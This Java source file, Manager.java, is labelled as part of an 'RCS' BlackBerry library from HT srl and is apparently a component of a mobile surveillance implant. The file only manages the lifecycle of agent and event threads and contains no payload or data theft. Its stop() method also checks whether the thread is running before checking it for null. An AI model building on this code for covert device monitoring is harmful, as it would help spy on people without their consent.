/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Manager.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.util.Vector;

import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.event.Event;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.StartStopThread;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * The Class Manager. Classe astratta che racchiude le funzionalita' di Manager,
 * utili a - far partire un servizio identificato da un id - far partire tutti i
 * servizi registrati - fermare un servizio identificato da un id - fermare
 * tutti i servizi - far fermare e far ripartire un servizio specifico
 */
public abstract class Manager {

	//#debug
    private static Debug debug = new Debug("Manager", DebugLevel.VERBOSE);

    /** The status obj. */
    public Status statusObj = null;

    /**
     * Instantiates a new manager.
     */
    protected Manager() {
        statusObj = Status.getInstance();
    }

    public final boolean isEnabled(int id) {
        StartStopThread thread = getItem(id);
        return thread.isEnabled();
    }

    public final void enable(int id) {
        StartStopThread thread = getItem(id);
        thread.enable(true);
    }

    public final boolean isRunning(int id) {
        return getItem(id).isRunning();
    }

    public abstract StartStopThread getItem(int id);

    public abstract Vector getAllItems();

    /**
     * Re start.
     * 
     * @param id
     *            the id
     * @return true, if successful
     */
    public boolean reStart(int id) {
        // #debug
         debug.trace("restart " + id);
        boolean ret = true;

        StartStopThread thread = getItem(id);
        if (thread == null) {
            // #debug
             debug.error("Thread unknown: " + id);
            return false;
        }

        if (thread.isEnabled() && thread.isRunning()) {
            thread.restart();
        } else {
            // #mdebug
             debug.error("cannot restart: " + id +
             " enabled:" + isEnabled(id)
             + " running:" + isRunning(id));
            // #enddebug
        }
        return ret;
    }

    /**
     * Start.
     * 
     * @param id
     *            the id
     * @return true, if successful
     */
    public final synchronized boolean start(int id) {

        StartStopThread thread = getItem(id);
        if (thread == null) {
            // #debug
             debug.error("Thread unknown: " + id);
            return false;
        }

        if (!thread.isEnabled()) {
            // #debug
             debug.error("Not enabled [0] " + id);
            return false;
        }

        if (thread.isRunning()) {
            // #debug
             debug.info("Start RUNNING" + id);
            return true;
        }

        thread.start();
        // #debug
         debug.trace("Start() OK");
        return true;
    }

    /**
     * Start all.
     * 
     * 
     * @return true, if successful
     */
    public final boolean startAll() {
        Vector threads = getAllItems();

        int tsize = threads.size();
        for (int i = 0; i < tsize; ++i) {
            StartStopThread thread = (StartStopThread) threads.elementAt(i);

            if (thread.isEnabled()) {
                thread.start();
                Utils.sleep(500);
            }
        }

        // #debug
         debug.trace("StartAll() OK");
        return true;
    }

    /**
     * Stop.
     * 
     * @param id
     *            the id
     * @return the int
     */
    public final synchronized boolean stop(int id) {
        StartStopThread thread = getItem(id);

        if (thread.isRunning()) {
            if (thread != null) {
                thread.stop();
            }

            try {
                thread.join();
            } catch (InterruptedException e) {
                // #debug
                 debug.error("Interrupted");
            }
        }

        return true;
    }

    /**
     * Stop all.
     * 
     * @return the int
     */
    public final boolean stopAll() {
        Vector threads = getAllItems();

        int tsize = threads.size();
        for (int i = 0; i < tsize; ++i) {
            StartStopThread thread = (StartStopThread) threads.elementAt(i);

            if (thread.isRunning()) {
                thread.stop();
                try {
                    thread.join();
                } catch (InterruptedException e) {
                    // #debug
                     debug.error("Interrupted");
                }
            }
        }

        // #debug
         debug.trace("StopAll() OK");
        return true;
    }
}
